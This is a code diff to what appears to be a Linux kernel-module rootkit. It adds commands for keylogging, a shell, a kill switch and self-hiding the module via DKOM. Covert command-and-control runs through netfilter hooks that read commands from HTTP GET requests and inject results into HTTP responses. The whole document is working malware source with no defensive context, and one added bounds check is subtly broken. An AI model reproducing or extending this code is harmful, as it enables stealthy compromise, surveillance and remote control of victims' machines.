@@ -7,8 +7,7 @@
 #include <linux/skbuff.h>
 #include <linux/version.h>
 #include <net/ip.h>
-
-
+#include "hidder.h"
 #include "cnc.h"
 
 
@@ -25,8 +24,11 @@ void set_result_msg(char * result_msg, size_t msg_len);
 
 typedef enum {
 	TEST = 0,
+	KEYLOGGER,
 	SELF_HIDE,
-	KEYLOGGER
+	UN_SELF_HIDE,
+	SHELL,
+	KILL
 }COMMANDS;
 
 
@@ -36,6 +38,7 @@ typedef enum {
 #define MINIMUM_CNC_DATA 170-24
 #define MAX_COMMAND_LEN 100
 #define MAX_RESULT_LEN 100
+
 #define GET 0x20544547
 #define HTTP_OK 0x50545448
 #define RESULT_HEADER_STR "Content-Encoding: "
@@ -123,14 +126,18 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 
 	if (unlikely(skb_linearize(pskb) != 0))
 	{
-		printk("[+] not linear\n");
+		printk("[-] not linear\n");
 		return NF_ACCEPT;
 	}
 
   	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
 	printk("len: %d\n", result_msg_len);
 
-
+	if (skb_tailroom < result_msg_len)
+	{
+		printk("[-] not enougth space\n");
+		return NF_ACCEPT;
+	}
   	ptr = (char*) skb_put(pskb, result_msg_len); 
 
   	memcpy(ptr, result_header, strlen(result_header));
@@ -226,10 +233,7 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	}
 	command[i-2] = 0x0;
 
-	//printk("command = %s (len %d)\n", command, i-2);
-
-	
-	//uintmax_t command_num = strtoumax(command, NULL, 10);
+	printk("cmd: %s\n", command);
 	if (kstrtol(command, 10, &command_num) != 0)
 	{
     	printk("[-] Invlid command.\n");
@@ -241,10 +245,24 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 			set_result_msg("Test OK", strlen("Test OK"));
 			printk("OK\n");
 			break;
+		case KILL:
+			set_result_msg("Bye", strlen("Bye"));
+			//Cannot kill from here, should be from main (we can change flag for closing)
+			//clean_rootkit();
+			break;
+		case SELF_HIDE:
+			set_result_msg("LKM is hide", strlen("LKM is hide"));
+			set_dkom_lkm();
+			break;
 
+		case UN_SELF_HIDE:
+			set_result_msg("LKM is not hide", strlen("LKM is not hide"));
+			unset_dkom_lkm();
+			break;
 		default:
+
 			set_result_msg("Invalid command", strlen("Invalid command"));
-			printk("Invalid command\n");
+			printk("[-] Invalid command - %d\n", command_num);
 			break;
 	}
 	return NF_ACCEPT;
